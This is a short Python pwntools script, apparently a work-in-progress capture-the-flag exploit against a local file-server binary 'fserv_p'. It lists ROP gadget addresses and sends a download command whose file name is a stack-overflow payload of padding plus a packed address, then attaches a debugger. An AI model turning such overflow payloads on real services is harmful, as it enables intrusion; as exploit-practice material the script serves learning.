from pwn import *

context.log_level = 'debug'
context.terminal = ['terminator','-x','bash','-c']
context.arch = 'amd64'

cn = process('./fserv_p')
bin = ELF('./fserv_p')


p_rdi=0x0000000000401683
p_rsi_r15 = 0x0000000000401681

def upload(filename,length,sth):
	pay = 'upload '+filename+' '+str(length)
	cn.sendline(pay)
	cn.sendline(sth)

def download(filename):
	pay = 'download '+filename
	cn.sendline(pay)


cn.recvuntil('WELCOME')

pay = 'a'*0x80 + p64(0x60FFFF)
gdb.attach(cn)
raw_input()
download(pay)

cn.interactive()

'''
download ret 0x401366

'''